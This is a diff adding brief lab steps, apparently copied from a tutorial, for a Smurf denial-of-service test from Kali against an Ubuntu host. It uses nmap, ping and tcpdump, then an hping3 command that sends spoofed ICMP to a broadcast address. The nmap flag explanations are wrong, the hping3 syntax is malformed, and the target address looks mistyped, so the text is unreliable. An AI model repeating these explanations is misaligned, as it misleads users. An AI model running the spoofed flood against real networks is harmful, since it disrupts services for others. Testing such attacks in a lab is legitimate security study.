@@ -1,0 +1,8 @@
+https://www.secuneus.com/smurf-dos-testing-ubuntu-using-kali-linux-hping3/
+
+Step 1: In kali type command  $nmap 196.168.176.129 (Target’s IP address i.e. Ubuntu)
+Step 2: $nmap -sP  196.168.176.129  (Run a fast scan on the target system, but bypass host discovery.)
+Step 3: $nmap -Pn  -sP  196.168.176.129   (The nmap utility can be used to detect the operating system of a particular target)
+Step 4: $ping 196.168.176.129 
+Step 5: (In Ubuntu System)    $sudo tcpdump -i ens33
+Step 6:(In Kali) $hping3 –icmp -c 1 spoof  196.168.176.129  196.168.176.255.
